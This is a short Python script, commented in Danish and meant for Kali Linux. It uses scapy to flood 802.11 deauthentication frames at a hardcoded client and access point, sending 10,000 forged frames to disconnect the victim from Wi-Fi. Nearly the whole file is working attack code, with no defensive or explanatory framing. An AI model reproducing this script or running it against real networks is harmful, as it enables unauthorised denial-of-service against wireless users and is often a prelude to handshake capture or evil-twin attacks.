"""
Skal køres via Kali linux -- kræver at interfacet er i monitor mode i forvejen lige pt.

@@airmon-ng wlan0 start@@
done.

"""

import time
from scapy.all import *

interface = "wlan0mon" #iface
timeout = 1

dest = "94:65:2D:D8:2E:16"
bssid = "40:F2:01:9A:42:56"

def deauth():
	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame_f = radio_p/dot11_frame/deauth
	sendp(frame_f,interface, count=10000,inter=0.02)

deauth()
